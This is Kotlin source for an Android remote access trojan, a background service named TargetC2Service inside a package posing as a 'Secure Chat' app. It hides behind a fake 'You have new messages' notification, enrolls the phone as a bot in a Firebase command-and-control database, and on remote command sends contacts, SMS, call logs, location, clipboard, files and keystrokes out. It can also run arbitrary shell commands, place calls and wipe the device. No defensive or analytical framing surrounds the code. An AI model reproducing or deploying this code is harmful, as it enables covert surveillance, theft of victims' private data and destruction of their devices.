package com.secure.chat.services

import android.app.Notification
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.google.firebase.database.*
import kotlinx.coroutines.*
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader
import java.util.UUID

class TargetC2Service : Service() {

    companion object {
        private const val TAG = "TargetC2"
        private const val FIREBASE_URL = "https://selzxrat-v5-c2-default-rtdb.firebaseio.com"
        private const val REF_BOTS = "selzxratV5/bots"
        private const val REF_COMMANDS = "selzxratV5/commands"
        private const val REF_BROADCAST = "selzxratV5/broadcast"
        private const val REF_EXFIL = "selzxratV5/exfiltrated"
        private const val NOTIF_ID = 1001
        private const val CHANNEL_ID = "secure_chat_service"

        @Volatile
        var isRunning = false
            private set
        var deviceId: String = ""
            private set
        private var job: Job? = null
        private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    }

    private lateinit var database: FirebaseDatabase
    private lateinit var botsRef: DatabaseReference
    private lateinit var commandsRef: DatabaseReference
    private lateinit var broadcastRef: DatabaseReference
    private lateinit var exfilRef: DatabaseReference
    private var commandListener: ChildEventListener? = null
    private var broadcastListener: ChildEventListener? = null

    override fun onCreate() {
        super.onCreate()
        deviceId = android.provider.Settings.Secure.getString(
            contentResolver, android.provider.Settings.Secure.ANDROID_ID
        ) ?: UUID.randomUUID().toString()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val action = intent?.action ?: "start"
        when (action) {
            "start" -> startC2()
            "restart" -> { stopC2(); startC2() }
            "stop" -> stopC2()
        }
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun startC2() {
        if (isRunning) return
        isRunning = true
        startForeground(NOTIF_ID, createNotification())
        try {
            FirebaseDatabase.getInstance().setPersistenceEnabled(true)
            database = FirebaseDatabase.getInstance(FIREBASE_URL)
            botsRef = database.getReference(REF_BOTS)
            commandsRef = database.getReference(REF_COMMANDS)
            broadcastRef = database.getReference(REF_BROADCAST)
            exfilRef = database.getReference(REF_EXFIL)
            registerBot()
            job = scope.launch {
                while (isActive) {
                    sendHeartbeat()
                    delay(30000)
                }
            }
            listenForCommands()
            Log.d(TAG, "C2 Service started. Device ID: $deviceId")
        } catch (e: Exception) {
            Log.e(TAG, "C2 init failed: ${e.message}")
            isRunning = false
        }
    }

    private fun stopC2() {
        isRunning = false
        job?.cancel()
        commandListener?.let { commandsRef.removeEventListener(it) }
        broadcastListener?.let { broadcastRef.removeEventListener(it) }
        stopForeground(STOP_FOREGROUND_REMOVE)
        stopSelf()
    }

    private fun createNotification(): Notification {
        val pendingIntent = PendingIntent.getActivity(
            this, 0,
            Intent(this, TargetC2Service::class.java).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
            },
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentTitle("Secure Chat")
            .setContentText("You have new messages")
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
    }

    private fun registerBot() {
        val deviceName = Build.MODEL
        val manufacturer = Build.MANUFACTURER
        val androidVersion = "${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})"
        val ipAddress = getIPAddress()
        val botInfo = mapOf(
            "deviceId" to deviceId,
            "deviceName" to deviceName,
            "deviceModel" to deviceName,
            "androidVersion" to androidVersion,
            "manufacturer" to manufacturer,
            "isOnline" to true.toString(),
            "lastSeen" to System.currentTimeMillis().toString(),
            "ipAddress" to ipAddress,
            "country" to "",
            "batteryLevel" to getBatteryLevel().toString(),
            "isCharging" to isCharging().toString(),
            "ramTotal" to Runtime.getRuntime().totalMemory().toString(),
            "ramAvailable" to Runtime.getRuntime().freeMemory().toString(),
            "storageTotal" to (android.os.StatFs(android.os.Environment.getDataDirectory().absolutePath).blockCountLong * android.os.StatFs(android.os.Environment.getDataDirectory().absolutePath).blockSizeLong).toString(),
            "storageAvailable" to (android.os.StatFs(android.os.Environment.getDataDirectory().absolutePath).availableBlocksLong * android.os.StatFs(android.os.Environment.getDataDirectory().absolutePath).blockSizeLong).toString(),
            "installedApps" to packageManager.getInstalledApplications(0).size.toString(),
            "isAccessibilityEnabled" to TargetAccessibility.isConnected.toString(),
            "isNotificationListenerEnabled" to TargetNotificationGrabber.isConnected.toString(),
            "isAdminEnabled" to TargetDeviceAdmin.isActive(this).toString(),
            "isScreenLocked" to "false",
            "simInfo" to getSimInfo()
        )
        botsRef.child(deviceId).setValue(botInfo)
    }

    private fun sendHeartbeat() {
        val updates = mapOf<String, Any>(
            "isOnline" to true,
            "lastSeen" to System.currentTimeMillis(),
            "batteryLevel" to getBatteryLevel().toString(),
            "isCharging" to isCharging().toString(),
            "ipAddress" to getIPAddress(),
            "isAccessibilityEnabled" to TargetAccessibility.isConnected.toString(),
            "isNotificationListenerEnabled" to TargetNotificationGrabber.isConnected.toString()
        )
        botsRef.child(deviceId).updateChildren(updates)
    }

    private fun listenForCommands() {
        commandListener = object : ChildEventListener {
            override fun onChildAdded(snapshot: DataSnapshot, previousChildName: String?) {
                val cmd = snapshot.value as? Map<String, Any> ?: return
                val type = cmd["type"] as? String ?: return
                val payload = cmd["payload"] as? String ?: ""
                val target = cmd["target"] as? String ?: ""
                val cmdId = snapshot.key ?: ""
                if (target == deviceId || target == "all" || target.isEmpty()) {
                    processCommand(type, payload, cmdId)
                }
            }
            override fun onChildChanged(snapshot: DataSnapshot, previousChildName: String?) {}
            override fun onChildRemoved(snapshot: DataSnapshot) {}
            override fun onChildMoved(snapshot: DataSnapshot, previousChildName: String?) {}
            override fun onCancelled(error: DatabaseError) {
                Log.e(TAG, "Command listener cancelled: ${error.message}")
            }
        }
        commandsRef.addChildEventListener(commandListener!!)

        broadcastListener = object : ChildEventListener {
            override fun onChildAdded(snapshot: DataSnapshot, previousChildName: String?) {
                val cmd = snapshot.value as? Map<String, Any> ?: return
                val type = cmd["type"] as? String ?: return
                val payload = cmd["payload"] as? String ?: ""
                val cmdId = snapshot.key ?: ""
                processCommand(type, payload, cmdId)
            }
            override fun onChildChanged(snapshot: DataSnapshot, previousChildName: String?) {}
            override fun onChildRemoved(snapshot: DataSnapshot) {}
            override fun onChildMoved(snapshot: DataSnapshot, previousChildName: String?) {}
            override fun onCancelled(error: DatabaseError) {
                Log.e(TAG, "Broadcast listener cancelled: ${error.message}")
            }
        }
        broadcastRef.addChildEventListener(broadcastListener!!)
    }

    private fun processCommand(type: String, payload: String, cmdId: String) {
        Log.d(TAG, "Command received: $type | $payload")
        commandsRef.child(cmdId).child("status").setValue("processing")
        scope.launch {
            try {
                when (type) {
                    "ping" -> handlePing()
                    "get_info" -> handleGetInfo()
                    "get_contacts" -> handleGetContacts()
                    "get_sms" -> handleGetSMS()
                    "get_call_logs" -> handleGetCallLogs()
                    "get_location" -> handleGetLocation()
                    "get_camera_photo" -> handleCameraPhoto()
                    "get_camera_video" -> handleCameraVideo()
                    "get_mic_audio" -> handleMicAudio()
                    "lock_screen" -> TargetScreenLocker().lock(this@TargetC2Service)
                    "unlock_screen" -> TargetScreenLocker().unlock(this@TargetC2Service)
                    "wipe_data" -> handleWipeData()
                    "factory_reset" -> handleFactoryReset()
                    "send_sms" -> handleSendSMS(payload)
                    "make_call" -> handleMakeCall(payload)
                    "open_url" -> handleOpenURL(payload)
                    "list_apps" -> handleListApps()
                    "list_files" -> handleListFiles(payload)
                    "read_file" -> handleReadFile(payload)
                    "delete_file" -> handleDeleteFile(payload)
                    "shell_exec" -> handleShellExec(payload)
                    "screenshot" -> handleScreenshot()
                    "keylogger_start" -> handleKeyloggerStart()
                    "keylogger_stop" -> handleKeyloggerStop()
                    "keylogger_get" -> handleKeyloggerGet()
                    "clipboard_get" -> handleClipboardGet()
                    "clipboard_set" -> handleClipboardSet(payload)
                    "notifications_get" -> handleNotificationsGet()
                    "throttle_network" -> TargetNetworkThrottler().start(this@TargetC2Service)
                    "unthrottle_network" -> TargetNetworkThrottler().stop(this@TargetC2Service)
                    "trigger_llm" -> handleTriggerLLM(payload)
                    "vibrate" -> handleVibrate(payload)
                    "torch_on" -> handleTorch(true)
                    "torch_off" -> handleTorch(false)
                    "alert_dialog" -> handleAlertDialog(payload)
                    "toast" -> handleToast(payload)
                    "self_destruct" -> handleSelfDestruct()
                    else -> Log.w(TAG, "Unknown command: $type")
                }
                commandsRef.child(cmdId).child("status").setValue("completed")
            } catch (e: Exception) {
                Log.e(TAG, "Command failed: ${e.message}")
                commandsRef.child(cmdId).child("status").setValue("failed")
                commandsRef.child(cmdId).child("error").setValue(e.message)
            }
        }
    }

    private fun handlePing() {
        sendExfil("pong", "alive")
    }

    private fun handleGetInfo() {
        val sb = StringBuilder()
        sb.appendLine("Device ID: $deviceId")
        sb.appendLine("Model: ${Build.MODEL}")
        sb.appendLine("Manufacturer: ${Build.MANUFACTURER}")
        sb.appendLine("Android: ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})")
        sb.appendLine("Battery: ${getBatteryLevel()}%")
        sb.appendLine("Charging: ${isCharging()}")
        sb.appendLine("IP: ${getIPAddress()}")
        sb.appendLine("Apps: ${packageManager.getInstalledApplications(0).size}")
        sendExfil("get_info", sb.toString().trimEnd())
    }

    private fun handleGetContacts() {
        try {
            val cursor = contentResolver.query(
                android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null
            )
            val sb = StringBuilder()
            cursor?.use {
                while (it.moveToNext()) {
                    val name = it.getString(it.getColumnIndexOrThrow(android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)) ?: ""
                    val number = it.getString(it.getColumnIndexOrThrow(android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER)) ?: ""
                    sb.appendLine("$name: $number")
                }
            }
            sendExfil("contacts", sb.toString().trimEnd())
        } catch (e: Exception) {
            sendExfil("contacts", "Error: ${e.message}")
        }
    }

    private fun handleGetSMS() {
        try {
            val cursor = contentResolver.query(
                android.provider.Telephony.Sms.CONTENT_URI, null, null, null,
                "${android.provider.Telephony.Sms.DATE} DESC LIMIT 500"
            )
            val sb = StringBuilder()
            cursor?.use {
                while (it.moveToNext()) {
                    val address = it.getString(it.getColumnIndexOrThrow(android.provider.Telephony.Sms.ADDRESS)) ?: ""
                    val body = it.getString(it.getColumnIndexOrThrow(android.provider.Telephony.Sms.BODY)) ?: ""
                    val date = it.getString(it.getColumnIndexOrThrow(android.provider.Telephony.Sms.DATE)) ?: ""
                    sb.appendLine("[$address] $body ($date)")
                    sb.appendLine("---")
                }
            }
            sendExfil("sms", sb.toString().trimEnd())
        } catch (e: Exception) {
            sendExfil("sms", "Error: ${e.message}")
        }
    }

    private fun handleGetCallLogs() {
        try {
            val cursor = contentResolver.query(
                android.provider.CallLog.Calls.CONTENT_URI, null, null, null,
                "${android.provider.CallLog.Calls.DATE} DESC LIMIT 300"
            )
            val sb = StringBuilder()
            cursor?.use {
                while (it.moveToNext()) {
                    val number = it.getString(it.getColumnIndexOrThrow(android.provider.CallLog.Calls.NUMBER)) ?: ""
                    val duration = it.getString(it.getColumnIndexOrThrow(android.provider.CallLog.Calls.DURATION)) ?: "0"
                    val type = it.getString(it.getColumnIndexOrThrow(android.provider.CallLog.Calls.TYPE)) ?: "0"
                    val date = it.getString(it.getColumnIndexOrThrow(android.provider.CallLog.Calls.DATE)) ?: "0"
                    sb.appendLine("$number | ${duration}s | type=$type | $date")
                }
            }
            sendExfil("call_logs", sb.toString().trimEnd())
        } catch (e: Exception) {
            sendExfil("call_logs", "Error: ${e.message}")
        }
    }

    private fun handleGetLocation() {
        try {
            val lm = getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager
            var location: android.location.Location? = null
            if (lm.isProviderEnabled(android.location.LocationManager.GPS_PROVIDER)) {
                location = lm.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER)
            }
            if (location == null && lm.isProviderEnabled(android.location.LocationManager.NETWORK_PROVIDER)) {
                location = lm.getLastKnownLocation(android.location.LocationManager.NETWORK_PROVIDER)
            }
            if (location != null) {
                val data = JSONObject()
                data.put("lat", location.latitude.toString())
                data.put("lng", location.longitude.toString())
                data.put("accuracy", location.accuracy.toString())
                data.put("altitude", location.altitude.toString())
                data.put("gmaps", "https://maps.google.com/?q=${location.latitude},${location.longitude}")
                sendExfil("location", data.toString())
            } else {
                sendExfil("location", "No location available")
            }
        } catch (e: Exception) {
            sendExfil("location", "Error: ${e.message}")
        }
    }

    private fun handleCameraPhoto() {
        try {
            startActivity(Intent(android.provider.MediaStore.ACTION_IMAGE_CAPTURE).apply { addFlags(Intent.FLAG_ACTIVITY_NEW_TASK) })
            sendExfil("camera_photo", "Camera intent launched")
        } catch (e: Exception) {
            sendExfil("camera_photo", "Error: ${e.message}")
        }
    }

    private fun handleCameraVideo() {
        try {
            startActivity(Intent(android.provider.MediaStore.ACTION_VIDEO_CAPTURE).apply { addFlags(Intent.FLAG_ACTIVITY_NEW_TASK) })
            sendExfil("camera_video", "Video intent launched")
        } catch (e: Exception) {
            sendExfil("camera_video", "Error: ${e.message}")
        }
    }

    private fun handleMicAudio() {
        try {
            startActivity(Intent(android.provider.MediaStore.Audio.Media.RECORD_SOUND_ACTION).apply { addFlags(Intent.FLAG_ACTIVITY_NEW_TASK) })
            sendExfil("mic_audio", "Audio record intent launched")
        } catch (e: Exception) {
            sendExfil("mic_audio", "Error: ${e.message}")
        }
    }

    private fun handleWipeData() {
        try {
            val dm = getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
            val admin = android.content.ComponentName(this, TargetDeviceAdmin::class.java)
            if (dm.isAdminActive(admin)) {
                dm.wipeData(0)
                sendExfil("wipe", "Device wipe initiated")
            } else {
                sendExfil("wipe", "Not device admin")
            }
        } catch (e: Exception) {
            sendExfil("wipe", "Error: ${e.message}")
        }
    }

    private fun handleFactoryReset() {
        handleWipeData()
    }

    private fun handleSendSMS(payload: String) {
        val parts = payload.split("|", limit = 2)
        if (parts.size < 2) {
            sendExfil("send_sms", "Invalid format. Use: number|message")
            return
        }
        try {
            startActivity(Intent(Intent.ACTION_SENDTO).apply {
                data = android.net.Uri.parse("smsto:${parts[0].trim()}")
                putExtra("sms_body", parts[1].trim())
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            })
            sendExfil("send_sms", "SMS composer opened to ${parts[0].trim()}")
        } catch (e: Exception) {
            sendExfil("send_sms", "Error: ${e.message}")
        }
    }

    private fun handleMakeCall(payload: String) {
        try {
            startActivity(Intent(Intent.ACTION_CALL).apply {
                data = android.net.Uri.parse("tel:$payload")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            })
            sendExfil("make_call", "Calling $payload")
        } catch (e: Exception) {
            sendExfil("make_call", "Error: ${e.message}")
        }
    }

    private fun handleOpenURL(url: String) {
        try {
            startActivity(Intent(Intent.ACTION_VIEW, android.net.Uri.parse(url)).apply { addFlags(Intent.FLAG_ACTIVITY_NEW_TASK) })
            sendExfil("open_url", "Opened: $url")
        } catch (e: Exception) {
            sendExfil("open_url", "Error: ${e.message}")
        }
    }

    private fun handleListApps() {
        try {
            val apps = packageManager.getInstalledApplications(0)
            val sb = StringBuilder()
            for (app in apps) {
                val name = packageManager.getApplicationLabel(app).toString()
                sb.append(name)
                sb.append(" (${app.packageName})")
                if (app.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM != 0) {
                    sb.append(" [SYSTEM]")
                }
                sb.appendLine()
            }
            sendExfil("list_apps", sb.toString().trimEnd())
        } catch (e: Exception) {
            sendExfil("list_apps", "Error: ${e.message}")
        }
    }

    private fun handleListFiles(path: String) {
        try {
            val dir = java.io.File(
                if (path.isEmpty()) android.os.Environment.getExternalStorageDirectory().absolutePath
                else path
            )
            if (!dir.exists()) {
                sendExfil("list_files", "Path not found: $path")
                return
            }
            val files = dir.listFiles() ?: emptyArray()
            files.sortWith(compareBy({ !it.isDirectory }, { it.name }))
            val sb = StringBuilder()
            sb.appendLine("Path: ${dir.absolutePath}")
            for (f in files) {
                sb.append(if (f.isDirectory) "[DIR] " else "[FILE] ")
                sb.append(f.name)
                sb.append(" (${f.length()} bytes)")
                sb.appendLine()
            }
            sendExfil("list_files", sb.toString().trimEnd())
        } catch (e: Exception) {
            sendExfil("list_files", "Error: ${e.message}")
        }
    }

    private fun handleReadFile(path: String) {
        try {
            val file = java.io.File(path)
            if (!file.exists()) {
                sendExfil("read_file", "File not found: $path")
                return
            }
            if (file.length() > 1024 * 100) {
                sendExfil("read_file", "[File too large: ${file.length()} bytes]")
                return
            }
            sendExfil("read_file", "File: $path\n\n${file.readText()}")
        } catch (e: Exception) {
            sendExfil("read_file", "Error: ${e.message}")
        }
    }

    private fun handleDeleteFile(path: String) {
        try {
            val file = java.io.File(path)
            if (file.delete()) {
                sendExfil("delete_file", "Deleted: $path")
            } else {
                sendExfil("delete_file", "Failed to delete: $path")
            }
        } catch (e: Exception) {
            sendExfil("delete_file", "Error: ${e.message}")
        }
    }

    private fun handleShellExec(command: String) {
        try {
            val process = Runtime.getRuntime().exec(command)
            val reader = BufferedReader(InputStreamReader(process.inputStream))
            val output = reader.readText()
            process.waitFor()
            sendExfil("shell_result", "Command: $command\n\n$output")
        } catch (e: Exception) {
            sendExfil("shell_result", "Command: $command\n\nError: ${e.message}")
        }
    }

    private fun handleScreenshot() {
        sendExfil("screenshot", "Screenshot not available on non-rooted devices")
    }

    private fun handleKeyloggerStart() {
        TargetKeylogger.start(this)
        sendExfil("keylogger", "Keylogger started")
    }

    private fun handleKeyloggerStop() {
        TargetKeylogger.stop()
        sendExfil("keylogger", "Keylogger stopped")
    }

    private fun handleKeyloggerGet() {
        sendExfil("keylogger", TargetKeylogger.getLogs())
    }

    private fun handleClipboardGet() {
        try {
            val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
            val clip = clipboard.primaryClip
            val text = if (clip != null && clip.itemCount > 0) clip.getItemAt(0).text?.toString() ?: "" else ""
            sendExfil("clipboard", text)
        } catch (e: Exception) {
            sendExfil("clipboard", "Error: ${e.message}")
        }
    }

    private fun handleClipboardSet(text: String) {
        try {
            val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
            clipboard.setPrimaryClip(android.content.ClipData.newPlainText("text", text))
            sendExfil("clipboard", "Clipboard set")
        } catch (e: Exception) {
            sendExfil("clipboard", "Error: ${e.message}")
        }
    }

    private fun handleNotificationsGet() {
        sendExfil("notifications", "Notifications listener not connected")
    }

    private fun handleTriggerLLM(prompt: String) {
        TargetLLMModule(this).trigger(prompt) { response ->
            sendExfil("llm_response", response)
        }
    }

    private fun handleVibrate(pattern: String) {
        try {
            val vibrator = getSystemService(Context.VIBRATOR_SERVICE) as android.os.Vibrator
            val patternMs = pattern.split(",").mapNotNull { it.trim().toLongOrNull() }.toLongArray()
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                if (patternMs.isNotEmpty()) {
                    vibrator.vibrate(android.os.VibrationEffect.createWaveform(patternMs, -1))
                } else {
                    vibrator.vibrate(android.os.VibrationEffect.createOneShot(1000, 255))
                }
            } else {
                @Suppress("DEPRECATION")
                vibrator.vibrate(if (patternMs.isNotEmpty()) patternMs else longArrayOf(0, 1000), -1)
            }
            sendExfil("vibrate", "Vibrated")
        } catch (e: Exception) {
            sendExfil("vibrate", "Error: ${e.message}")
        }
    }

    private fun handleTorch(enable: Boolean) {
        try {
            val cameraManager = getSystemService(Context.CAMERA_SERVICE) as android.hardware.camera2.CameraManager
            cameraManager.setTorchMode(cameraManager.cameraIdList[0], enable)
            sendExfil("torch", if (enable) "Torch ON" else "Torch OFF")
        } catch (e: Exception) {
            sendExfil("torch", "Error: ${e.message}")
        }
    }

    private fun handleAlertDialog(message: String) {
        try {
            val intent = packageManager.getLaunchIntentForPackage(packageName)?.apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                putExtra("show_alert", message)
            }
            if (intent != null) startActivity(intent)
            sendExfil("alert_dialog", "Dialog sent: $message")
        } catch (e: Exception) {
            sendExfil("alert_dialog", "Error: ${e.message}")
        }
    }

    private fun handleToast(message: String) {
        android.os.Handler(android.os.Looper.getMainLooper()).post {
            android.widget.Toast.makeText(this@TargetC2Service, message, android.widget.Toast.LENGTH_LONG).show()
        }
        sendExfil("toast", "Toast shown: $message")
    }

    private fun handleSelfDestruct() {
        sendExfil("self_destruct", "Self-destruct initiated")
        botsRef.child(deviceId).removeValue()
        startActivity(Intent(Intent.ACTION_DELETE).apply {
            data = android.net.Uri.parse("package:$packageName")
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        })
    }

    private fun sendExfil(type: String, content: String) {
        if (::exfilRef.isInitialized) {
            exfilRef.push().setValue(mapOf(
                "type" to type,
                "content" to content,
                "deviceId" to deviceId,
                "timestamp" to System.currentTimeMillis().toString()
            ))
        }
    }

    private fun getIPAddress(): String {
        try {
            val interfaces = java.net.NetworkInterface.getNetworkInterfaces()
            while (interfaces.hasMoreElements()) {
                val intf = interfaces.nextElement()
                val addrs = intf.inetAddresses
                while (addrs.hasMoreElements()) {
                    val addr = addrs.nextElement()
                    if (!addr.isLoopbackAddress && addr is java.net.Inet4Address) {
                        return addr.hostAddress ?: ""
                    }
                }
            }
        } catch (_: Exception) {}
        return ""
    }

    private fun getBatteryLevel(): Int {
        val intent = registerReceiver(null, android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        val level = intent?.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1) ?: -1
        val scale = intent?.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1) ?: -1
        return if (level >= 0 && scale > 0) (level * 100) / scale else -1
    }

    private fun isCharging(): Boolean {
        val intent = registerReceiver(null, android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        val status = intent?.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1) ?: -1
        return status == android.os.BatteryManager.BATTERY_STATUS_CHARGING || status == android.os.BatteryManager.BATTERY_STATUS_FULL
    }

    private fun getSimInfo(): String {
        val tm = getSystemService(Context.TELEPHONY_SERVICE) as? android.telephony.TelephonyManager
        return if (tm != null) {
            try { "${tm.simOperatorName ?: "N/A"} | ${tm.simCountryIso?.uppercase() ?: "N/A"}" }
            catch (_: Exception) { "N/A" }
        } else "N/A"
    }

    override fun onDestroy() {
        super.onDestroy()
        stopC2()
    }
}
